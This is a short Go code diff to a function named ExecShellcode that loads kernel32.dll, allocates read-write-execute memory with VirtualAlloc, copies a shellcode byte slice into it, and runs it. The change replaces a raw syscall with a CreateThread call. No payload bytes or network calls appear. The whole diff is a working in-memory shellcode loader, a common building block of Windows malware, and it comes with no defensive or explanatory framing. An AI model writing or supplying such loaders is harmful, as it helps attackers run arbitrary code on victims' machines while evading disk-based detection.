@@ -51,6 +51,7 @@ func ExecShellcode(shellcode []byte) {
 	// Resolve kernell32.dll, and VirtualAlloc
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
 	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
+	procCreateThread := kernel32.MustFindProc("CreateThread")
 	// Reserve space to drop shellcode
 	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 	// Ugly, but works
@@ -59,5 +60,5 @@ func ExecShellcode(shellcode []byte) {
 	for i, value := range shellcode {
 		addrPtr[i] = value
 	}
-	go syscall.Syscall(address, 0, 0, 0, 0)
+	procCreateThread.Call(0, 0, address, 0, 0, 0)
 }
